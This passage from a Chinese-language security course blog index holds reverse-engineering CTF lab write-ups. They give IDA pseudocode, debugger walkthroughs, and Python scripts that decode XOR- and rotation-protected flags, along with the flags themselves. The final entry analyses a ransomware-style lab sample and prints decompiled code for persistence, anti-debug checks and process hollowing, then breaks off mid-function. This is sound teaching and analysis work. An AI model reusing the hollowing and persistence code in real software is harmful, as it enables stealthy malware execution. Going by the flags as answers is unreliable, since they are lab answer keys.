[BitVec(f\u0026#39;bt_{i}\u0026#39;, 8) for i in range(len)] # 加上constraint - 以此lab來說每一個flag字元都應該限制在空白到0x7f之間 for bv in bvs: s.add(And(bv \u0026gt;= 0x20, bv \u0026lt;= 0x7f)) for i in range(len): iv = f\u0026#39;int(hex(iv)[2:][-2:], 16)\u0026#39; bvs_formula = f\u0026#39;(({eval(iv)}) ^ bvs[{i}])\u0026#39; s.add(eval(bvs_formula) == target[i]) RotateRight = f\u0026#39;int(bin({iv_formula} \u0026lt;\u0026lt; (32-3))[-32:-29] + bin({iv_formula} \u0026gt;\u0026gt; 3)[2:], 2)\u0026#39; iv_formula = f\u0026#39;{int(hex(iv)[2:][-2:], 16)}\u0026#39; iv_formula = f\u0026#39;{len} + ({iv_formula} ^ {iv}) - {i}\u0026#39; print(f\u0026#39;iv_formula = {iv_formula}\u0026#39;) # 如果有解的話就會做以下操作 if s.check() == sat: print(\u0026#39;Find ~~~\u0026#39;) print(s.model()) flag = \u0026#34;\u0026#34; for bv in bvs: flag += chr(s.model()[bv].as_long()) print(flag) ::: :::spoiler angr solver\nimport angr import claripy # 建立一個project root = \u0026#39;Reverse/HW3/Evil FlagChecker/\u0026#39; proj = angr.Project(root + \u0026#39;test.exe\u0026#39;) # 建立Claripy Symbol sym_arg = claripy.BVS(\u0026#39;sym_arg\u0026#39;, 8 * 23) # 就像z3一樣要建立symbol # 建立初始的state state = proj.factory.entry_state(stdin=sym_arg) simgr = proj.factory.simulation_manager(state) # 有了proj/symbol/initial state之後就要開始讓他跑起來 # simgr.explore(find = lambda s: b\u0026#39;Good!\u0026#39; in s.posix.dumps(1)) simgr.explore(find = lambda s: b\u0026#34;Good!\u0026#34; in s.posix.dumps(1), avoid=lambda s: b\u0026#34;No no no...\u0026#34; in s.posix.dumps(1)) if len(simgr.found) \u0026gt; 0: print(simgr.found[0].solver.eval(sym_arg, cast_to=bytes)) else: print(\u0026#34;NONONONO\u0026#34;) :::\nFlag: FLAG{jmp1ng_a1l_ar0und}\n"},{"id":421,"href":"/security/course/ntu-cs/reverse/simple-reverse---0x06lab---amessagebox/","title":"Simple Reverse 0x06(Lab - AMessageBox)","section":"Securities","content":" Simple Reverse 0x06(Lab - AMessageBox) # Background # 組合語言ROL和RCL的區別\nRecon # 這一題其實以逆向的角度來說很簡單\n先用DIE看一些資訊 發現有加UPX的殼，這件事情可以透過IDA更加確定 可以看到Function Name只有start然後反組譯的地方看起來很噁心，那應該就是在拆殼的步驟 先執行看看 需要輸入flag然後用一個message box噴錯 用x64-dbg 透過TA的講解，可以知道這一題不需要解殼，只需要用動態debugger看一下就可以了 我們知道題目有使用到message box的API，所以我們可以先鎖定該API在哪邊呼叫，再往回trace出他的判斷 我們可以利用符號的視窗看到這支程式有用到那些API Module(.dll)，而message box的API是在user32.dll，用下面的搜尋可以縮小範圍，但這個多種類的messagebox，具體來說是用哪一個也不知道，所以可以全選後都設立中斷點 剩下的就是跟一般debugger差不多的操作，當追到call messagebox之前的break point時，可以看一下call stack(呼叫堆疊)往前trace是誰呼叫了API，發現是00C7110B，點進去看一下可以明顯看到Correct/Wrong的字樣，所以可以判斷應該是這一段程式在判斷我們輸入的東西 分析判斷的程式 這裡就是要考驗耐心和不斷的觀察register的變化，認真看大概花個半小時就可以知道這一段在幹嘛(我就菜QAQ) 結論是中間的那些==重要的操作==其實就是左旋轉+XOR 0x87這樣而已，所以我們就可以開寫腳本了，把東西反著作回去就好了 Exploit # import binascii enc_flag = [0xB5, 0xE5, 0x8D, 0xBD, 0x5C, 0x46, 0x36, 0x4E, 0x4E, 0x1E, 0x0E, 0x26, 0xA4, 0x1E, 0x0E, 0x4E, 0x46, 0x06, 0x16, 0xAC, 0xB4, 0x3E, 0x4E, 0x16, 0x94, 0x3E, 0x94, 0x8C, 0x94, 0x8C, 0x9C, 0x4E, 0xA4, 0x8C, 0x2E, 0x46, 0x8C, 0x6C] def pad(m): length = 0 if len(m) % 8 != 0: length = 8-len(m) % 8 return \u0026#39;0\u0026#39; * length + m FLAG = [] for i in range(len(enc_flag)): enc_flag[i] ^= 0x87 tmp = pad(bin(enc_flag[i])[2:]) tmp = hex(int(tmp[-3:] + tmp[:-3], 2)) FLAG.append(binascii.unhexlify(tmp[2:]).decode()) print(\u0026#34;\u0026#34;.join(FLAG)) Flag: FLAG{8699314d319802ef792b7babac9da58a}\n"},{"id":422,"href":"/security/course/ntu-cs/reverse/simple-reverse---0x08lab---getprocaddress/","title":"Simple Reverse 0x08(Lab - GetProcAddress)","section":"Securities","content":" Simple Reverse 0x08(Lab - GetProcAddress) # Background # GetModuleFileNameA 函式 createFileA 函式 setFilePointer 函式 ReadFile 函式\nSource Code # :::spoiler IDA main function\nint __cdecl main(int argc, const char **argv, const char **envp) { char *v3; // rdi __int64 i; // rcx char v6[32]; // [rsp+0h] [rbp-40h] BYREF char v7; // [rsp+40h] [rbp+0h] BYREF char lpFilename[304]; // [rsp+50h] [rbp+10h] BYREF char lpBuffer[136]; // [rsp+180h] [rbp+140h] BYREF char flag[64]; // [rsp+208h] [rbp+1C8h] BYREF __int64 File_HANDLE_VALUE; // [rsp+248h] [rbp+208h] int j; // [rsp+264h] [rbp+224h] v3 = \u0026amp;v7; for ( i = 146i64; i; --i ) { *v3 = 0xCCCCCCCC; v3 += 4; } sub_140011375(\u0026amp;unk_1400230B5); sub_1400113AC(); printf(\u0026#34;Give me flag: \u0026#34;); scanf(\u0026#34;%39s\u0026#34;, flag); (GetModuleFileNameA_0)(0i64, lpFilename, 260i64); File_HANDLE_VALUE = (CreateFileA)( lpFilename, 0x80000000i64, FILE_SHARE_READ, 0i64, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0i64); if ( File_HANDLE_VALUE == -1 || ((SetFilePointer)(File_HANDLE_VALUE, 0x4Ei64, 0i64, FILE_BEGIN), !(ReadFile)(File_HANDLE_VALUE, lpBuffer, 39i64, 0i64, 0i64)) ) { LABEL_11: puts(\u0026#34;Wrong...\u0026#34;); } else { for ( j = 0; j \u0026lt; 39; ++j ) { if ( (flag[j] ^ lpBuffer[j]) != byte_14001E000[8 * j] ) goto LABEL_11; } puts(\u0026#34;Correct!!!\u0026#34;); } sub_140011311(v6, \u0026amp;unk_14001BB18); return 0; } :::\nRecon # 這一題一樣，如果是以解題為目的話，其實很簡單，但還是想要提到重要的主題也就是PEB，但我覺得與其用IDA一個一個分析，不如直接用x64dbg幫你跑好就可以直接知道哪個API在哪個address，會比較方便，雖然不排除會有一些方式可以繞過或是混淆，但\u0026hellip;有遇到在說吧，反正之後在還債吧!\n先執行看看，看有沒有甚麼string可以在IDA中trace 找到main function後轉而用x64dbg，並且找到main function entry address，然後設定breakpoint，並且trace code 如果遇到x64dbg中顯示一些import dll function，可以對照IDA並且rename，這樣大概就可以用IDA的反組譯的方式查看整體的流程 看到main function最下面的else$\\to$if statement，在看回去x64dbg就可以知道byte_14001e000的那些char是哪些 開寫script Exploit # str1 = [0x12, 0x24, 0x28, 0x34, 0x5B, 0x3A, 0x07, 0x1C, 0x13, 0x2D, 0x00, 0x32, 0x43, 0x16, 0x12, 0x1A, 0x01, 0x02, 0x1D, 0x5A, 0x07, 0x01, 0x7F, 0x35, 0x10, 0x1A, 0x70, 0x1B, 0x01, 0x43, 0x05, 0x2B, 0x37, 0x52, 0x08, 0x1C, 0x17, 0x44, 0x53] str2 = [0x54, 0x68, 0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64, 0x65, 0x2E] FLAG = [] for i in range(39): tmp = str1[i] ^ str2[i] FLAG.append(bytes.fromhex(\u0026#39;{:x}\u0026#39;.format(tmp)).decode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;\u0026#34;.join(FLAG)) Flag: FLAG{Just_a_customized_GetProcAddress!}\n"},{"id":423,"href":"/security/course/ntu-cs/reverse/simple-reverse---0x11lab---exception/","title":"Simple Reverse 0x11(Lab - Exception)","section":"Securities","content":" Simple Reverse 0x11(Lab - Exception) # Background # 乘法、除法的運用 — 組合語言筆記 try-except 陳述式\nEXCEPTION_CONTINUE_EXECUTION (-1) 例外狀況已關閉。 在例外狀況發生的位置繼續執行。 EXCEPTION_CONTINUE_SEARCH 無法辨識 (0) 例外狀況。 繼續搜尋處理常式的堆疊，先搜尋包含 try-except 語句，然後針對具有下一個最高優先順序的處理常式。 EXCEPTION_EXECUTE_HANDLER 辨識 (1) 例外狀況。 藉由執行 __except 複合陳述式將控制權傳送至例外狀況處理常式，然後在 區塊之後 __except 繼續執行。 Source Code # :::spoiler IDA Psuedo Code\nint __cdecl main(int argc, const char **argv, const char **envp) { char Str[112]; // [rsp+20h] [rbp+0h] BYREF int i; // [rsp+A0h] [rbp+80h] printf(\u0026#34;Give me flag: \u0026#34;); scanf(\u0026#34;%s\u0026#34;, Str); if ( strlen(Str) == 38 ) { for ( i = 0; i \u0026lt; 38; ++i ) { if ( Str[i] != byte_14000A000[i] ) goto LABEL_7; } puts(\u0026#34;Correct :\u0026gt;\u0026#34;); } else { LABEL_7: puts(\u0026#34;Wrong :\u0026lt;\u0026#34;); } return 0; } :::\nRecon # 這一題真的頗複雜(應該也還好\u0026hellip;)，但有一些陷阱和套路，這一題是有關於exception的結構分析\n詳細解析Exception的結構，請看課程影片\n透過上課教的方式找到Exception Handler Address 有兩種方式\n看PE-Bear\n首先我們先看IDA反組譯的psuedo code發現和原始的組語有一些出入(反黃的地方)，代表有一些地方沒有翻出來，此時我們就可以先分析一下是不是有甚麼問題，發現在15DE的地方有個除法，且除數是零，代表一定會發生exception 此時就可以用PE-Bear看一下相關的資訊，首先15DE是包含在1590-1748的Scope，所以要找的unwind address就是9750 實際來到9750就會像下圖一樣，但基本上還是需要自己create structure並且手動輸入offset 從xref main function去找\n首先在IDA中找到main function，用XRef的方式找到其他呼叫main function的地方，再跟進去，基本上後面的address跟進去就會是跟上面的地方一樣，這個方法有可能會失敗 分析整體的exception handler 看了一下code發現有兩個地方會跳exception，一個是前面提到的==15DE==，另外一個是1660，看了一下三個handler的exception return value1，發現分別是0, 1, -1，所以可以先稍微用肉眼跟一下會發生甚麼事 當exception 1發生時，會先看第一條scope發現雖然在範圍內可是return value是零，代表無法辨識要繼續搜尋，可以看到符合第二條scope的範圍且return value是1，此時就會直接跳到==161D==。而當第二個exception發生時，是在==1660==，只有符合第三條指令，但return value是-1，代表他會回復原始的狀態並跳到下一個RIP\nSCOPE_RECORD \u0026lt;rva loc_1400015D5, rva loc_1400015E2, rva sub_140006170, rva loc_1400015E2\u0026gt; SCOPE_RECORD \u0026lt;rva loc_1400015D5, rva loc_14000161D, rva sub_140006183, rva loc_14000161D\u0026gt; SCOPE_RECORD \u0026lt;rva loc_140001657, rva loc_140001664, rva sub_140006199, rva loc_140001664\u0026gt; 用x64dbg看一下整體的流程\n首先第一個exception正如我們所說，跳到==161D==，並做一些操作，這邊就要很仔細分析，明顯看到他會跳過一段不重要的code，然後在1626-1654的地方形成一個for-loop，主要的操作是把我們輸入的flag和一個東西做XOR，這個東西實際上去看就是0xBE, 0xBF, 0xC0, 0xC1,...,0xE3(共38個連續數值)。 For-loop結束後就會遇到第二個exception，但實際跟上去後會發現它不是跳到我們預期的RIP而是跳到169F(不是很清楚為甚麼會這樣)，所以如果盲目的分析中間的第二個loop其實就是浪費時間，因為根本不會執行到，而這一段for-loop在做的事情就是把剛剛第一個exception處理完的結果和一些data相加然後取低位byte，而那些data實際跟上去會是0xEF, 0xF0, 0xF1,...,0xFF, 0x00, 0x01,...,0x14，這裡非常重要，因為0xFF再上去不是0x100而是一樣取低位byte，變成從零開始 ==2023/07/03更新：== 經過助教的說明，已經知道為甚麼他會跳到169F，可以看一下上課講義中提到的_C_specific_handler，就在975C，用IDA跟進去看一下發現他在呼叫_C_specific_handler之前有做了一些操作，他把context的RIP改掉了，有一點hook的感覺，原本exception 2發生時要回去的地方應該是1660但加上0x3F之後就變成169F，和我們實際跑的結果相符合 :::spoiler 上課講義 ::: :::spoiler 額外操作 ::: 上述兩個exception做完之後就會直接和encrypted flag進行比對，所以我們要做的事情就是倒過來執行這些東西(encrypted flag - 0xEF,...,0x14 + 0x100) ^ (0xBE, 0xBF, 0xC0, 0xC1,...,0xE3) = FLAG Exploit # first_for_loop = [190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227] second_for_loop = [239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20] enc_flag = [0xE7, 0xE3, 0x72, 0x78, 0xAC, 0x90, 0x90, 0x7C, 0x90, 0xAC, 0xB1, 0xA6, 0xA4, 0x9E, 0xA7, 0xA2, 0xAC, 0x90, 0xB9, 0xB2, 0xBF, 0xBB, 0xBD, 0xB6, 0xAB, 0x90, 0xBA, 0xB4, 0x90, 0xBF, 0xC0, 0xC0, 0xC4, 0xCA, 0x95, 0xED, 0xC0, 0xB2] FLAG = [] for i in range(38): # print(hex(flag[i] ^ enc_flag[i])[2:], end=\u0026#34;\u0026#34;) if enc_flag[i] - second_for_loop[i] \u0026lt; 0: tmp = hex(first_for_loop[i] ^ (enc_flag[i] - second_for_loop[i] + 0x100))[2:] else: tmp = hex(first_for_loop[i] ^ (enc_flag[i] - second_for_loop[i]))[2:] FLAG.append(bytes.fromhex(tmp).decode(\u0026#39;cp437\u0026#39;)) print(\u0026#34;\u0026#34;.join(FLAG)) Flag: FLAG{__C_specific_handler_is_hooked:O}\nReference # try-except 陳述式\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":424,"href":"/security/course/ntu-cs/reverse/simple-reverse---0x12lab---tlscallback/","title":"Simple Reverse 0x12(Lab - TLSCallback)","section":"Securities","content":" Simple Reverse 0x12(Lab - TLSCallback) # Background # 課程相關影片 [C語言] function pointer的應用[四]: function pointer array\nSource Code # :::spoiler IDA main function\nint __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rbx int v4; // edi __int64 v5; // r14 char *v6; // rsi __int64 v7; // rax const char *v8; // rcx printf(\u0026#34;Give me flag: \u0026#34;); scanf(\u0026#34;%58s\u0026#34;); v3 = 0i64; v4 = 0; v5 = 0i64; v6 = flag; do { (funcs_140001156[v4 % 3u])(\u0026amp;flag[v5]); ++v6; v7 = v5 \u0026amp; 3; ++v4; ++v5; *(v6 - 1) += key_140004050[v7]; } while ( v4 \u0026lt; 58 ); while ( flag[v3] == byte_1400022B8[v3] ) { if ( ++v3 \u0026gt;= 58 ) { v8 = \u0026#34;Correct!\u0026#34;; goto LABEL_7; } } v8 = \u0026#34;Wrong QAO\u0026#34;; LABEL_7: puts(v8); return 0; } :::\nRecon # 這一題也蠻簡單的，只要有耐心分析一下就可以了\n首先執行一下這隻程式，發現沒啥特別的，就和之前的題目一樣 用IDA看一下，可以發現也蠻單純的，就用function pointer array然後傳入我們輸入的flag進行一些事情再加上一個數值(來自某一個array) 仔細看一下有哪些function然後分別做了甚麼事 xor 0x87 :::spoiler source void __fastcall do_xor(_BYTE *a1) { *a1 ^= 0x87u; } ::: xor 0xff :::spoiler source void __fastcall do_inverse(_BYTE *a1) { *a1 = ~*a1; } ::: xor 0x63 :::spoiler source void __fastcall do_xor_2(_BYTE *a1) { *a1 ^= 0x63u; } ::: 陷阱 如果直接分析這樣的code會做白工，因為這一題有tls callback function在搞事，這件事情IDA和x64dbg都有分析出來，或者是也可以用PE-Bear看一下，所以我們就朝這個方向分析一下，看起來兩者都沒有很複雜，tlscallback function 2就只是把剛剛前面的function pointer array的順序置換一下，而tlscallback function 1也只是用置換過後的function pointer array把key的數值做一些操作而已，如果看psuedo code看不太懂得話可以直接用x64dbg用肉眼跟一下(我就這樣XDD)，應該也是可以很直觀的猜出這些事情 :::spoiler TLS Callback function 1 \u0026amp; 2 ::: 用x64dbg直接動態跟code，以下的screenshot我都有加上一些comment幫助理解 TLSCallback相關的code 三個Function pointer main function 結論 在function pointer的順序是xor 0x63 $\\to$ xor 0x87 $\\to$ xor 0xff 在key的部分是0x21 $\\to$ 0xce $\\to$ 0x39 $\\to$ 0x40 xor 0x63 + 0x21 xor 0x87 + 0xce xor 0xff + 0x39 xor 0x63 + 0x40 xor 0x87 + 0x21 xor 0xff + 0xce xor 0x63 + 0x39 ... :::info Note: 相加的部分最後只會取==低位byte==喔，所以如果減回去發現是負的，就要在加0x100導正回來 ::: 開寫script Exploit # key = [0x21, 0xCE, 0x39, 0x40] enc_flag = [0x46, 0x99, 0xF7, 0x64, 0x1D, 0x79, 0x44, 0x22, 0xC1, 0xD3, 0x27, 0xCD, 0x31, 0xC1, 0xD9, 0x77, 0xEC, 0x7A, 0x75, 0x24, 0xBF, 0xDD, 0x24, 0xDD, 0x23, 0xB2, 0xCD, 0x7C, 0x02, 0x58, 0x46, 0x24, 0xAC, 0xD8, 0x21, 0xD1, 0x5D, 0xBC, 0xC5, 0x7C, 0x05, 0x6C, 0x48, 0x2B, 0xBB, 0xD5, 0x11, 0xCB, 0x35, 0xB6, 0xD9, 0x57, 0x0F, 0x60, 0x3F, 0x34, 0xFF, 0xEC] def xor(index, val): if index % 3 == 0: return val ^ 0x63 elif index % 3 == 1: return val ^ 0x87 else: return val ^ 0xff FLAG = [] for i in range(len(enc_flag)): tmp = enc_flag[i] - key[i % 4] if tmp \u0026lt; 0: tmp += 0x100 tmp = xor(i, tmp) FLAG.append(bytes.fromhex(hex(tmp)[2:]).decode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;\u0026#34;.join(FLAG)) Flag: FLAG{The_first_TLS_callback_function_is_called_two_times!}\n"},{"id":425,"href":"/security/course/ntu-cs/reverse/simple-reverse---0x13lab---meow/","title":"Simple Reverse 0x13(Lab - Meow)","section":"Securities","content":" Simple Reverse 0x13(Lab - Meow) # Background # 課程影片 - Process Injection 一開始看真的看不太懂，只知道大概的邏輯，簡單來說應該是在原有的process中插入其他的process使其被執行，有以下幾種\nDLL Injection APC Injection Early Bird APC Injection Process Hollowing Reflective DLL Injection Recon # 其實這一題如果沒有TA先破哏，基本上我是直接放棄的，解題之前可以先看破哏教學 簡單來說這整支程式就是先把預先藏好的code解密出來，然後利用Process Hollowing的方式inject到原本的程式，而這支外插進來的code就會對我們輸入的flag進行一些操作，然後再跟他原本的encrypted flag進行比較。當我們知道這些事情之後，就可以開始分析了\n先在IDA中找到隱藏的code解密的function 我是直接看TA教學的部分，不然我應該也找不出來，除非用x64dbg慢慢跟，具體來說是在main function中if statement的第二個function 跟進去後的sub_401550() :::spoiler Decrypt Hidden Code\n__int64 sub_401550() { __int64 result; // rax unsigned int i; // [rsp+Ch] [rbp-4h] for ( i = 0; ; ++i ) { result = i; if ( i \u0026gt; 0x3FFF ) break; *(dword_404040 + i) += i % 7; *(dword_404040 + i) ^= byte_404020[i \u0026amp; 7]; } return result; } :::\n利用Scylla把memory(也就是隱藏的執行檔)dump出來 我們知道他在做甚麼之後，就可以用x64dbg的plugin(Scylla)把整支程式dump下來，要做到這件事情就需要知道他的位置在哪邊以及要dump多少的memory。透過上面的code我們可以在他return之前的address記錄下來然後在x64dbg下斷點(0x4015FE)，然後觀察她前面的code把decrypt的code放在哪邊 透過上圖，應該不難看出他是東西放在0x404040，跟進去發現是MZ開頭的magic header就是我們要找的起始位置，而具體來說要dump多大的記憶體呢?可以從IDA分析的source code發現他在counter大於0x3fff的時候就會跳出迴圈，那也就是說大小應該是0x4000才對 有了隱藏的code之後就來分析一下他對我們輸入的flag做了甚麼操作 用IDA看了一下，簡單來說這支隱藏程式就像是meow.exe的server side，下圖是兩者的對照，做邊是隱藏的code，右邊是meow.exe(被inject的victim)，可以看到右邊的meow.exe在我們輸入了flag後就把flag寫在某個記憶體中(==WriteFile==)，而左邊的程式就會去該地址撈flag(==ReadFile==)，然後在下面有一個sub_401550(flag)的function然後flag被傳入，看起來就是要對flag做一些操作(source code如下)，操作完後就會再把enc_flag寫到某個memory中，而右面的meow.exe就會再到記憶體中撈資料進行後續的比對 :::spoiler Encrypted Flag Source Code\n__int64 __fastcall sub_401550(char *flag) { int v1; // r8d __int64 result; // rax int i; // [rsp+Ch] [rbp-4h] for ( i = 0; i \u0026lt;= 38; ++i ) { flag[i] ^= key[i % 0xBui64]; v1 = flag[i]; result = (v1 + 2 * (i % 3)); flag[i] = v1 + 2 * (i % 3); } return result; } :::\n整體的流程大概就是這樣，所以如果專注在解題的話其實只需要注意輸入的flag如何被加密就好，再開寫script\nExploit # enc_flag = [0x24, 0x1D, 0x1B, 0x31, 0x21, 0x0B, 0x4F, 0x0F, 0xE8, 0x50, 0x37, 0x5B, 0x08, 0x40, 0x4A, 0x08, 0x1D, 0x11, 0x4A, 0xB8, 0x11, 0x67, 0x3F, 0x67, 0x38, 0x14, 0x3F, 0x19, 0x0B, 0x54, 0xB4, 0x09, 0x63, 0x12, 0x68, 0x2A, 0x45, 0x53, 0x0E] key = [0x62, 0x57, 0x56, 0x76, 0x64, 0x77, 0x3D, 0x3D, 0x87, 0x63, 0x0] FLAG = [] for i in range(39): enc_flag[i] -= (2 * (i % 3)) enc_flag[i] ^= key[i % 11] FLAG.append(bytes.fromhex(hex(enc_flag[i])[2:]).decode(\u0026#39;cp437\u0026#39;)) print(\u0026#34;\u0026#34;.join(FLAG)) Flag: FLAG{pr0c355_h0ll0w1ng_4nd_n4m3d_p1p35}\n"},{"id":426,"href":"/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x302023-hw---baby-ransom-1/","title":"Simple Reverse 0x30(2023 HW - Baby Ransom 1)","section":"Securities","content":" Simple Reverse 0x30(2023 HW - Baby Ransom 1) # Background # VirtualProtect 函式 記憶體保護常數 InternetOpenUrlA 函式 SetFileAttributesW 函式 Schtasks 工作排程 IsDebuggerPresent 函式 FindResourceA 函式 LoadResource 函式\nSource code # :::spoiler IDA Main Function\nint __cdecl main(int argc, const char **argv, const char **envp) { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-\u0026#34;+\u0026#34; TO EXPAND] StackBase = NtCurrentTeb()-\u0026gt;NtTib.StackBase; while ( 1 ) { DestInitValue = _InterlockedCompareExchange64(\u0026amp;qword_140017050, StackBase, 0i64); if ( !DestInitValue ) { v5 = 0; goto LABEL_7; } if ( StackBase == DestInitValue ) break; Sleep(1000u); } v5 = 1; LABEL_7: if ( unk_140017058 == 1 ) { amsg_exit(31i64); } else if ( unk_140017058 ) { dword_140017008 = 1; } else { unk_140017058 = 1; initterm(\u0026amp;qword_140019018, qword_140019028); } if ( unk_140017058 == 1 ) { initterm(\u0026amp;qword_140019000, \u0026amp;qword_140019010); unk_140017058 = 2; } if ( !v5 ) _InterlockedExchange64(\u0026amp;qword_140017050, 0i64); if ( TlsCallback_0 ) TlsCallback_0(0i64, 2); sub_14000226B(); v6 = 0i64; qword_1400170E0 = SetUnhandledExceptionFilter(\u0026amp;loc_140002530); (InterlockedExchange64)(nullsub_1); InitFloatUnit(); v7 = dword_140017028; space = malloc(8i64 * (dword_140017028 + 1)); v9 = qword_140017020; space_cp = space; while ( v7 \u0026gt; v6 ) { size = strlen(*(v9 + 8 * v6)) + 1; dest = malloc(size); *(space_cp + 8 * v6) = dest; src = *(v9 + 8 * v6++); qmemcpy(dest, src, size); } qword_140017020 = space_cp; if ( v7 \u0026lt; 0 ) v7 = 0i64; *(space_cp + 8 * v7) = 0i64; sub_140001F1E(); _initenv = qword_140017018; dword_140017010 = (NetworkConfig_1DBB)(dword_140017028, qword_140017020);// 0x140017020 =\u0026gt; 0x254CA9C1580 if ( !dword_14001700C ) exit(dword_140017010); if ( !dword_140017008 ) cexit(); return dword_140017010; } ::: :::spoiler IDA NetworkConfig_1DBB\n__int64 NetworkConfig_1DBB() { void *hInternet; // [rsp+38h] [rbp-18h] sub_140001F1E(); hInternet = InternetOpenA(0i64, 1u, 0i64, 0i64, 0); if ( InternetOpenUrlA(hInternet, (LPCSTR)szUrl, 0i64, 0, 0x84000000, 0i64) )// INTERNET_FLAG_RELOAD + INTERNET_FLAG_NO_CACHE_WRITE // =\u0026gt; retrieve the orginal item // =\u0026gt; don\u0026#39;t write this item to the cache return 0i64; else return Reverse_URL_Part1(); } ::: :::spoiler IDA Reverse_URL_Part1\n__int64 Reverse_URL_Part1() { PWSTR ppszPathOut; // [rsp+38h] [rbp-38h] BYREF int char_1; // [rsp+44h] [rbp-2Ch] PWSTR ppszPath; // [rsp+48h] [rbp-28h] BYREF LPWSTR lpFilename; // [rsp+50h] [rbp-20h] LPWSTR lpWideCharStr; // [rsp+58h] [rbp-18h] int cchWideChar; // [rsp+64h] [rbp-Ch] int j; // [rsp+68h] [rbp-8h] int i; // [rsp+6Ch] [rbp-4h] if ( SHGetKnownFolderPath((const KNOWNFOLDERID *const)\u0026amp;unk_14000AA80, KF_FLAG_DEFAULT, 0i64, \u0026amp;ppszPath) ) return 0i64; for ( i = 7; i \u0026lt;= 22; i += 4 ) { char_1 = *(_DWORD *)((char *)szUrl + i); for ( j = 0; j \u0026lt;= 3; ++j ) { LOBYTE(char_1) = char_1 - 43; char_1 = __ROR4__(char_1, 8); } char_1 ^= 0x6F6F6F6Fu; *(_DWORD *)((char *)szUrl + i) = char_1; } HIBYTE(szUrl[2]) = 0; cchWideChar = MultiByteToWideChar(CP_UTF8, 0, (LPCCH)szUrl + 7, -1, 0i64, 0); if ( !cchWideChar ) return 0i64; lpWideCharStr = (LPWSTR)malloc(2i64 * cchWideChar); if ( !lpWideCharStr ) return 0i64; MultiByteToWideChar(CP_UTF8, 0, (LPCCH)szUrl + 7, -1, lpWideCharStr, cchWideChar); if ( PathAllocCombine(ppszPath, lpWideCharStr, PATHCCH_NONE, \u0026amp;ppszPathOut) ) { free(lpWideCharStr); return 0i64; } else { CreateDirectoryW(ppszPathOut, 0i64); SetFileAttributesW(ppszPathOut, 0x26u); // FILE_ATTRIBUTE_ARCHIVE + FILE_ATTRIBUTE_SYSTEM + FILE_ATTRIBUTE_HIDDEN lpFilename = (LPWSTR)malloc(0x208ui64); GetModuleFileNameW(0i64, lpFilename, 0x104u); if ( PathAllocCombine(ppszPathOut, lpWideCharStr, 0, \u0026amp;ppszPathOut) ) { free(lpWideCharStr); free(lpFilename); return 0i64; } else if ( MoveFileW(lpFilename, ppszPathOut) ) { SetFileAttributesW(ppszPathOut, 0x26u); // FILE_ATTRIBUTE_ARCHIVE + FILE_ATTRIBUTE_SYSTEM + FILE_ATTRIBUTE_HIDDEN free(lpWideCharStr); free(lpFilename); return Reverse_URL_Part2(ppszPathOut); } else { free(lpWideCharStr); free(lpFilename); ImportatntPart(); return 0i64; } } } ::: :::spoiler IDA NextStagePayload\nvoid __stdcall NextStagePayload() { if ( !(unsigned int)off_140007088() // isDebuggerPresent || !*(_QWORD *)(qword_140017030 + 8) || strcmp((const char *)(*(_QWORD *)(qword_140017030 + 8) + 9i64), \u0026#34;start!!\u0026#34;) ) { Reverse_URL_Part3_getEmbeddedPeFile_(); } } ::: :::spoiler IDA Reverse_URL_Part3_getEmbeddedPeFile_\nvoid __stdcall Reverse_URL_Part3_getEmbeddedPeFile_() { __int64 v0; // [rsp+58h] [rbp-28h] BYREF __int64 Buffer; // [rsp+60h] [rbp-20h] BYREF int v2; // [rsp+6Ch] [rbp-14h] struct _PROCESS_INFORMATION ProcessInformation; // [rsp+70h] [rbp-10h] BYREF struct _STARTUPINFOA StartupInfo; // [rsp+90h] [rbp+10h] BYREF DWORD v5; // [rsp+104h] [rbp+84h] BYREF int *v6; // [rsp+108h] [rbp+88h] BYREF LPCONTEXT lpContext; // [rsp+110h] [rbp+90h] int j; // [rsp+118h] [rbp+98h] int i; // [rsp+11Ch] [rbp+9Ch] getEmbeddedPE_File((LPVOID *)\u0026amp;v6, \u0026amp;v5); memset(\u0026amp;StartupInfo, 0, sizeof(StartupInfo)); StartupInfo.cb = 104; memset(\u0026amp;ProcessInformation, 0, sizeof(ProcessInformation)); for ( i = 121; i \u0026lt;= 124; i += 4 ) { v2 = *(_DWORD *)\u0026amp;szUrl[i]; for ( j = 0; j \u0026lt;= 3; ++j ) { LOBYTE(v2) = v2 - 80; v2 = __ROR4__(v2, 8); } v2 ^= 0x7E7E7E7Eu; *(_DWORD *)\u0026amp;szUrl[i] = v2; } szUrl[125] = 0; CreateProcessA(0i64, \u0026amp;szUrl[121], 0i64, 0i64, 0, 4u, 0i64, 0i64, \u0026amp;StartupInfo, \u0026amp;ProcessInformation); lpContext = (LPCONTEXT)VirtualAlloc(0i64, 0x4D0ui64, 0x1000u, 4u); lpContext-\u0026gt;ContextFlags = 0x10000B; if ( GetThreadContext(ProcessInformation.hThread, lpContext) ) { sub_1400013B4(v6, v5, ProcessInformation.hProcess, \u0026amp;Buffer, \u0026amp;v0); WriteProcessMemory(ProcessInformation.hProcess, (LPVOID)(lpContext-\u0026gt;Rdx + 16), \u0026amp;Buffer, 8ui64, 0i64); lpContext-\u0026gt;Rcx = v0 + Buffer; SetThreadContext(ProcessInformation.hThread, lpContext); ResumeThread(ProcessInformation.hThread); CloseHandle(ProcessInformation.hProcess); CloseHandle(ProcessInformation.hThread); } } ::: :::spoiler IDA getEmbeddedPE_File\nHRSRC __fastcall getEmbeddedPE_File(LPVOID *pe_file, 